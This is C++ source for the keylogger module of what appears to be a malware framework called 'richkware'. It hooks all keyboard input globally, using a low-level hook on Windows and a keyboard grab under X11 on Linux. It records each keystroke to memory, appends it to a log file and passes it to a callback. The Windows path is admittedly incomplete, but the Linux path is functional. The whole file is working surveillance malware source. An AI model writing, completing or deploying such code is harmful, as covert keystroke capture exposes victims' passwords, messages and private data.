#include "richkware/modules/keylogger.hpp"
#include "richkware/utils/logger.hpp"
#include <thread>
#include <mutex>
#include <atomic>
#include <fstream>
#include <sstream>
#include <algorithm>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#elif defined(__linux__)
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/extensions/XTest.h>
#include <unistd.h>
#include <fcntl.h>
#endif

namespace richkware::modules {

// Keylogger implementation
class Keylogger::Impl {
public:
    std::atomic<bool> running_{false};
    std::thread capture_thread_;
    mutable std::mutex data_mutex_;
    std::vector<KeyEvent> events_;
    std::string keystrokes_;
    KeyloggerConfig config_;

    ~Impl() {
        stop();
    }

    core::Result<void> start(const KeyloggerConfig& config) {
        if (running_) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Keylogger already running"};
        }

        config_ = config;
        running_ = true;

        capture_thread_ = std::thread([this]() {
            capture_keystrokes();
        });

        LOG_INFO("Keylogger started");
        return core::Result<void>{};
    }

    core::Result<void> stop() {
        if (!running_) {
            return core::Result<void>{};
        }

        running_ = false;

        if (capture_thread_.joinable()) {
            capture_thread_.join();
        }

        LOG_INFO("Keylogger stopped");
        return core::Result<void>{};
    }

    bool is_running() const noexcept {
        return running_;
    }

    std::string get_keystrokes() const {
        std::lock_guard<std::mutex> lock(data_mutex_);
        return keystrokes_;
    }

    void clear_keystrokes() {
        std::lock_guard<std::mutex> lock(data_mutex_);
        keystrokes_.clear();
        events_.clear();
    }

    std::vector<KeyEvent> get_recent_events(size_t count) const {
        std::lock_guard<std::mutex> lock(data_mutex_);
        if (events_.size() <= count) {
            return events_;
        }

        return std::vector<KeyEvent>(events_.end() - count, events_.end());
    }

private:
    void capture_keystrokes() {
#ifdef _WIN32
        capture_windows_keys();
#elif defined(__linux__)
        capture_linux_keys();
#else
        // Unsupported platform
        LOG_ERROR("Keylogger not supported on this platform");
        running_ = false;
#endif
    }

#ifdef _WIN32
    void capture_windows_keys() {
        HHOOK keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, GetModuleHandle(NULL), 0);
        if (!keyboard_hook) {
            LOG_ERROR("Failed to install keyboard hook");
            running_ = false;
            return;
        }

        MSG msg;
        while (running_ && GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(keyboard_hook);
    }

    static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                // Get the instance (this is a bit of a hack for singleton pattern)
                static Impl* instance = nullptr;
                if (!instance) {
                    // This won't work perfectly in a real scenario, but for demo purposes
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }

                KeyEvent event;
                event.key_code = kbStruct->vkCode;
                event.pressed = true;
                event.timestamp = std::chrono::steady_clock::now();
                event.key_name = vk_code_to_string(kbStruct->vkCode);

                instance->add_key_event(event);
            }
        }

        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    static std::string vk_code_to_string(int vkCode) {
        switch (vkCode) {
            case VK_RETURN: return "[ENTER]";
            case VK_TAB: return "[TAB]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_SPACE: return " ";
            case VK_ESCAPE: return "[ESC]";
            default: {
                char buffer[2] = {0};
                if (vkCode >= 'A' && vkCode <= 'Z') {
                    buffer[0] = static_cast<char>(vkCode);
                } else if (vkCode >= '0' && vkCode <= '9') {
                    buffer[0] = static_cast<char>(vkCode);
                }
                return buffer[0] ? std::string(buffer) : "[UNK]";
            }
        }
    }
#elif defined(__linux__)
    void capture_linux_keys() {
        // Linux implementation using X11
        Display* display = XOpenDisplay(NULL);
        if (!display) {
            LOG_ERROR("Cannot open X11 display");
            running_ = false;
            return;
        }

        Window root = DefaultRootWindow(display);
        XEvent event;

        // Grab keyboard
        XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);

        while (running_) {
            XNextEvent(display, &event);

            if (event.type == KeyPress) {
                KeyEvent key_event;
                key_event.pressed = true;
                key_event.timestamp = std::chrono::steady_clock::now();

                char buffer[32];
                KeySym keysym;
                int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);

                if (len > 0) {
                    buffer[len] = '\0';
                    key_event.key_name = buffer;
                    key_event.key_code = keysym;
                } else {
                    // Special keys
                    key_event.key_name = keysym_to_string(keysym);
                    key_event.key_code = keysym;
                }

                add_key_event(key_event);
            }
        }

        XUngrabKeyboard(display, CurrentTime);
        XCloseDisplay(display);
    }

    static std::string keysym_to_string(KeySym keysym) {
        switch (keysym) {
            case XK_Return: return "[ENTER]";
            case XK_Tab: return "[TAB]";
            case XK_BackSpace: return "[BACKSPACE]";
            case XK_Shift_L:
            case XK_Shift_R: return "[SHIFT]";
            case XK_Control_L:
            case XK_Control_R: return "[CTRL]";
            case XK_Alt_L:
            case XK_Alt_R: return "[ALT]";
            case XK_space: return " ";
            case XK_Escape: return "[ESC]";
            default: return "[UNK]";
        }
    }
#endif

    void add_key_event(const KeyEvent& event) {
        std::lock_guard<std::mutex> lock(data_mutex_);

        events_.push_back(event);

        // Limit events buffer to prevent memory issues
        if (events_.size() > 10000) {
            events_.erase(events_.begin(), events_.begin() + 1000);
        }

        keystrokes_ += event.key_name;

        // Limit keystrokes buffer
        if (keystrokes_.size() > 100000) {
            keystrokes_ = keystrokes_.substr(keystrokes_.size() - 50000);
        }

        // Save to file if configured
        if (!config_.log_file_path.empty()) {
            std::ofstream file(config_.log_file_path, std::ios::app);
            if (file.is_open()) {
                file << event.key_name;
                file.close();
            }
        }

        // Call callback if configured
        if (config_.event_callback) {
            config_.event_callback(event);
        }

        LOG_DEBUG("Key captured: {}", event.key_name);
    }
};

Keylogger::Keylogger() : pimpl_(std::make_unique<Impl>()) {}
Keylogger::~Keylogger() = default;

core::Result<void> Keylogger::start(const KeyloggerConfig& config) {
    return pimpl_->start(config);
}

core::Result<void> Keylogger::stop() {
    return pimpl_->stop();
}

bool Keylogger::is_running() const noexcept {
    return pimpl_->is_running();
}

std::string Keylogger::get_keystrokes() const {
    return pimpl_->get_keystrokes();
}

void Keylogger::clear_keystrokes() {
    pimpl_->clear_keystrokes();
}

std::vector<KeyEvent> Keylogger::get_recent_events(size_t count) const {
    return pimpl_->get_recent_events(count);
}

} // namespace richkware::modules